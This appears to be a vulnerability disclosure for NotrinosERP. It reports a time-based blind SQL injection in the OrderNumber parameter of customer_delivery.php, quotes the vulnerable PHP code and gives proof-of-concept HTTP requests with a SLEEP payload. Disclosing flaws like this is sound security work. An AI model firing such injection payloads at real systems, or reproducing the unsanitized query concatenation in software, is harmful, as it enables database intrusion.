# Description
The endpoint **/sales/customer_delivery.php** is vulnerable to Blind SQL Injection (Time-based) via the GET parameter **OrderNumber**. This endpoint can be triggered through the following menu: Sales - Sales Order Entry - Place Order - Make Delivery Against This Order. From the source code perspective, the endpoint will execute the **adjust_shipping_charge** function in the **\sales\customer_delivery.php** file line number 107. As shown in the code snippet below, the OrderNumber parameter is taken directly from the query string and passed into the function without any sanitization or escaping.


```
adjust_shipping_charge($ord, $_GET['OrderNumber']);
```



The adjust_shipping_charge function itself can be found in the **\sales\includes\db\sales_delivery_db.inc** file line number 203. In that function the OrderNumber parameter or $trans_no is concatenated directly into the SQL query.

```
function adjust_shipping_charge(&$delivery, $trans_no) {
	$sql = "SELECT sum(ov_freight) as freight FROM ".TB_PREF."debtor_trans WHERE order_ = $trans_no AND type = " . ST_CUSTDELIVERY . " AND debtor_no = " . $delivery->customer_id;
	$result = db_query($sql, 'Can not find delivery notes');
```

This allows the attacker to inject malicious OrderNumber payloads to execute the malicious SQL query.

# Proof of Concept

Triggering time delays with MySQL sleep function.

Normal request will take around 200 milis (0.2 seconds) response time

```
GET /NotrinosERP/sales/customer_delivery.php?OrderNumber=10 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/NotrinosERP/sales/sales_order_entry.php?AddedID=12
Cookie: Notrinos2938c152fda6be29ce4d5ac3a638a781=8s9gl1g6fphudemau5ul3polro; FAinstall=n916ogdqa12ni92dlhmgqiv7gt
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

The following malicious request with OrderNumber parameter set to `10+OR+SLEEP(1)%23` will take around 14000 milis (14 seconds) response time.

```
GET /NotrinosERP/sales/customer_delivery.php?OrderNumber=10+OR+SLEEP(1)%23 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/NotrinosERP/sales/sales_order_entry.php?AddedID=12
Cookie: Notrinos2938c152fda6be29ce4d5ac3a638a781=8s9gl1g6fphudemau5ul3polro; FAinstall=n916ogdqa12ni92dlhmgqiv7gt
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

```

Note: The orderNumber (e.g., 10) need to be valid/existing order number.

